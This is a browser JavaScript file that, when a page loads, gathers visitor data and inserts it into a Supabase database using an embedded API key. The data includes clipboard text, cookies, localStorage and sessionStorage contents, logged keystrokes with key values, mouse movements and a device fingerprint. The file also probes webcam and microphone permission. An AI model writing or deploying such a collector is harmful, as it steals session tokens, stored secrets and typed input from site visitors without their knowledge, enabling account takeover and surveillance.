// script.js

import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";

// Supabase configuration
const supabaseUrl = "https://gsmnzfbcxmhywznchoxq.supabase.co";
const supabaseAnonKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdzbW56ZmJjeG1oeXd6bmNob3hxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY4NzI4NDgsImV4cCI6MjA3MjQ0ODg0OH0.0seF_SbMoSP5RkEZRGLcfDM07yE2T0EdyGgpgXFcs6c";
const supabase = createClient(supabaseUrl, supabaseAnonKey);

async function insertDeviceInfo(deviceInfo) {
  const { data, error } = await supabase
    .from("device_info")
    .insert([deviceInfo]) // assumes a JSONB column called "data"
    .select();

  if (error) {
    console.error("Error inserting device info:", error);
  } else {
    console.log("Device info inserted successfully:", data);
  }
}

async function getDeviceInfo() {
  const deviceInfo = {};

  // Device Type & Browser Info
  deviceInfo.device_type = navigator.userAgent;
  deviceInfo.browser_version = navigator.appVersion;
  deviceInfo.operating_system = navigator.platform;
  deviceInfo.screen_resolution = `${window.screen.width}x${window.screen.height}`;
  deviceInfo.time_zone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  deviceInfo.language_settings = navigator.languages;
  deviceInfo.browser_fingerprint =
    navigator.userAgent + navigator.appVersion;

  // Hardware Specs
  deviceInfo.hardware_specs = {
    cpuCores: navigator.hardwareConcurrency,
    memory: navigator.deviceMemory,
  };

  // Battery Status
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      deviceInfo.battery_status = battery.level;
    } catch (err) {
      console.error("Battery API error:", err);
    }
  }

  // Clipboard Content
  try {
    const text = await navigator.clipboard.readText();
    deviceInfo.clipboard_content = text;
  } catch (err) {
    deviceInfo.clipboard_content = null;
    console.warn("Clipboard read not allowed:", err);
  }

  // Installed Fonts
  try {
    deviceInfo.installed_fonts = [...document.fonts.values()].map(
      (font) => font.family
    );
  } catch {
    deviceInfo.installed_fonts = [];
  }

  // Installed Plugins
  deviceInfo.installed_plugins = Array.from(navigator.plugins).map(
    (plugin) => plugin.name
  );

  // Mouse Movements (captured after DOM load)
  deviceInfo.mouse_movements = [];
  document.addEventListener("mousemove", (event) => {
    deviceInfo.mouse_movements.push({
      x: event.clientX,
      y: event.clientY,
      time: Date.now(),
    });
  });

  // Keystroke Timing
  deviceInfo.keystroke_timing = [];
  document.addEventListener("keydown", (event) => {
    deviceInfo.keystroke_timing.push({
      key: event.key,
      time: Date.now(),
    });
  });

  // Browser Cookies
  deviceInfo.browser_cookies = document.cookie;

  // Local Storage
  deviceInfo.browser_local_storage = Object.fromEntries(
    Object.keys(localStorage).map((key) => [key, localStorage.getItem(key)])
  );

  // Session Storage
  deviceInfo.browser_session_storage = Object.fromEntries(
    Object.keys(sessionStorage).map((key) => [
      key,
      sessionStorage.getItem(key),
    ])
  );

  // Webcam Access
  deviceInfo.webcam_access = false;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    deviceInfo.webcam_access = true;
    stream.getTracks().forEach(track => track.stop());
  } catch (err) {
    console.warn("Webcam access not allowed:", err);
  }

  // Microphone Access
  deviceInfo.microphone_access = false;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    deviceInfo.microphone_access = true;
    stream.getTracks().forEach(track => track.stop());
  } catch (err) {
    console.warn("Microphone access not allowed:", err);
  }

  // Fingerprinting
  deviceInfo.fingerprinting = true; // Assuming fingerprinting is enabled by default

  // Clipboard Hijack
  deviceInfo.clipboard_hijack = false; // Assuming clipboard hijack is not enabled by default

  // Downloaded Files
  deviceInfo.downloaded_files = []; // Assuming no downloaded files by default

  // Session Data
  deviceInfo.session_data = Object.fromEntries(
    Object.keys(sessionStorage).map((key) => [
      key,
      sessionStorage.getItem(key),
    ])
  );

  return deviceInfo;
}

document.addEventListener("DOMContentLoaded", async () => {
  const deviceInfo = await getDeviceInfo();
  await insertDeviceInfo(deviceInfo);
});
